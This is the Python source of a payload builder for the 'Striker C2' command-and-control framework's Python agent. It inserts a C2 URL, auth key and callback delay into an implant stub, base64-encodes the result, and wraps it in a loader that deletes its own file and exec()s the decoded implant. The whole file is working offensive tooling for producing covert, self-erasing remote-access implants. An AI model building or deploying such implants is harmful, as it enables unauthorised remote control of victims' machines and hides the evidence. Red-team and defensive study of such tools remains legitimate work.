#!/usr/bin/python3
#----------------------------------------------------------
#   The payload builder for the python agent of Striker C2.
# Note that this does not obfuscate the implant. It just
# add the C2 config to the payload stub and base64-encode
# the result. 
#                                        Author: Umar Abdul
#----------------------------------------------------------

import sys, os
from base64 import b64encode

def main(url, authKey, delay, stub, outfile):
  if len(authKey) != 32:
    print("[-] Auth key must be 32 characters long!")
    return 1
  if not os.path.isfile(stub):
    print("[-] Invalid file: " + stub)
    return 1
  if (delay < 1):
    print("[-] Callback delay must be an integer >= 1")
    return 1
  if not url.startswith("http://") and not url.startswith("https://"):
    print("[-] Only HTTP(s) URLs are supported!")
    return 1
  print("[*] Loading agent stub...")
  payload = open(stub, "r").read()
  print("[*] Writing configs...")
  payload = payload.replace("[STRIKER_URL]", url)
  payload = payload.replace("[STRIKER_AUTH_KEY]", authKey)
  payload = payload.replace("[STRIKER_DELAY]", str(delay))
  payload = b64encode(payload.encode())
  payload = b"import os, sys, base64; os.remove(sys.argv[0]); exec(base64.b64decode(\"" + payload + b"\"))"
  wfo = open(outfile, "wb")
  wfo.write(payload)
  wfo.close()
  print("[+] Agent built successfully: " + outfile)
  return 0

if __name__ == '__main__':
  if len(sys.argv) < 6:
    print("[-] Usage: %s <url> <auth_key> <delay> <stub> <outfile>" %(os.path.basename(sys.argv[0])))
    exit(1)
  main(sys.argv[1], sys.argv[2], int(sys.argv[3]), sys.argv[4], sys.argv[5])
  exit(0)
